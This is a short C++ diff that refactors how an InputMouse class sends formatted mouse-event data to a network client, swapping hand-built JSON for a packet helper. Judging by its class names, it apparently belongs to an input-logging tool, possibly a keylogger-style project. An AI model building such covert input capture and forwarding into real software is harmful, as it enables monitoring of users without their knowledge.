@@ -26,11 +26,6 @@ AInputType &InputMouse::operator>>(LogFile &logger)
 
 AInputType &InputMouse::operator>>(IClient &client)
 {
-	JSONBuilder builder;
-
-	builder.addValue("type", "cmd");
-	builder.addValue("name", "key");
-	builder.addValue("param", _format + "[MOUSE " + _data + "]");
-	client << builder.get();
+	client << StaticTools::CreatePacket(PacketType::PT_MouseEvent, _format + "[MOUSE " + _data + "]");
 	return (*this);
 }
